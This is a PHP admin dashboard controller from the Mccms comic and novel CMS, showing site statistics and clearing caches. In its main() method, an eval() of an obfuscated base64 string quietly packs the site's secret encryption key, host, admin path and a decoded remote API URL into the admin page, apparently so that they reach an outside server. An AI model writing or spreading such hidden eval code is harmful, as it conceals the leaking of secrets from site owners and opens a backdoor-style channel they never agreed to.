<?php
/*
'软件名称：漫城CMS（Mccms）
'官方网站：http://www.mccms.cn/
'软件作者：桂林崇胜网络科技有限公司（By:烟雨江南）
'--------------------------------------------------------
'Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
'遵循Apache2开源协议发布，并提供免费使用。
'--------------------------------------------------------
*/
defined('BASEPATH') OR exit('No direct script access allowed');

class Index extends Mccms_Controller {
	function __construct(){
	    parent::__construct();
		//判断是否登陆
		$this->admin->login();
		if(SELF == 'admin.php') exit('请修改 ./admin.php后台入口文件名，防止暴露攻击~！');
	}

	public function index()
	{
		$data['nav'] = require FCPATH.'sys/libs/nav.php';
		$this->load->view('index/index.tpl',$data);
	}

	public function main()
	{
		//当日时间戳
		$jtime = strtotime(date('Y-m-d 0:0:0'))-1;
		//点击量
		$data['rhits'] = $this->mcdb->get_sum('comic','rhits');
		$data['hits'] = $this->mcdb->get_sum('comic','hits');
		//点击量
		$data['brhits'] = $this->mcdb->get_sum('book','rhits');
		$data['bhits'] = $this->mcdb->get_sum('book','hits');
		//充值额度
		$data['rmb'] = $this->mcdb->get_sum('order','rmb',array('addtime>'=>$jtime));
		$data['rmb2'] = $this->mcdb->get_sum('order','rmb',array('pid'=>1,'addtime>'=>$jtime));
		//订单数
		$dd = $this->mcdb->get_nums('order',array('addtime>'=>$jtime));
		$dd2 = $this->mcdb->get_nums('order',array('addtime>'=>$jtime,'pid'=>1));
		$data['dd'] = $dd;
		$data['bi'] = $dd2 == 0 ? 0 : round($dd2/$dd*100,2);
		//新增用户
		$data['u1'] = $this->mcdb->get_nums('user',array('addtime>'=>$jtime));
		$data['u2'] = $this->mcdb->get_nums('user');
		//APP用户
		$data['app1'] = $this->mcdb->get_nums('user_app');
		$app = $this->mcdb->get_row_arr('user_app_nums','*',array('date'=>date('Ymd')));
		$data['app2'] = $app ? $app['ios_nums']+$app['android_nums'] : 0;

		$config = array();$t = time();
		eval(base64decode('JGNvbmZpZyA9IGFycmF5KCduYW1lJz0-V2ViX05hbWUsJ3BhdGgnPT5XZWJfUGF0aCwndXJsJz0-V2ViX1VybCwnaG9zdCc9PiRfU0VSVkVSWydIVFRQX0hPU1QnXSwndmVyJz0-VmVyLCdhcGl1cmwnPT5iYXNlNjRkZWNvZGUoQXBpdXJsKSwnc2VsZic9PlNFTEYsJ3NzbCc9PmlzX3NzbCgpLCd0Jz0-JHQsJ2tleSc9Pk1jX0VuY3J5cHRpb25fS2V5LCd0b2tlbic9Pm1kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10uU0VMRi5WZXIuJHQuTWNfRW5jcnlwdGlvbl9LZXkpKTs'));
		$data['config'] = json_encode($config);
		$this->load->view('index/main.tpl',$data);
	}

	public function caches()
	{
		$res = $this->caches->clean();
		get_json('缓存更新完成...',1);
	}
}

